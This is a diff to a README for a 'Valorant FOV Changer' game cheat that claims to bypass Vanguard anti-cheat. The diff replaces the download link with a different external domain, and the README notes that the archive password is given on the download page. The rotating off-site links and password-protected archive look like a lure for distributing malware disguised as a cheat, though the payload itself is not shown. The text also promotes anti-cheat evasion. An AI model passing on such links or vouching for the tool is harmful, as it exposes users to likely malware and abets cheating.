@@ -18,7 +18,7 @@ Valorant FOV Changer - undetected cheat for Valorant. Bypasses Vanguard anti-che
 
 ## Download
 
-[![Download v3.2.0](https://img.shields.io/badge/Download_v3.2.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/valfovchanger)
+[![Download v3.2.0](https://img.shields.io/badge/Download_v3.2.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valfovchanger)
 
 > The archive password is shown on the download page.
 
